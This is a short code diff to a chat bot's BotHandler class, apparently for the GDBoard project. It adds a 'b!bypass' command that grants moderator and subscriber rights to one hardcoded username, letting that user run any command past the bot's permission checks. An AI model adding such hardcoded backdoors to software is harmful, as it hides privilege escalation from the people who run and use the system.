@@ -89,6 +89,12 @@ public class BotHandler {
 						goThrough = false;
 					}
 				}
+				if (com.equalsIgnoreCase("b!bypass") && user.equalsIgnoreCase("Alphalaneous")) {
+					com = arguments[1];
+					arguments = Arrays.copyOfRange(arguments, 1, arguments.length);
+					isMod = true;
+					isSub = true;
+				}
 				boolean aliasesExist = false;
 				if (Files.exists(Paths.get(Defaults.saveDirectory + "/GDBoard/commands/aliases.txt"))) {
 					Scanner sc2 = new Scanner(Paths.get(Defaults.saveDirectory + "/GDBoard/commands/aliases.txt").toFile());
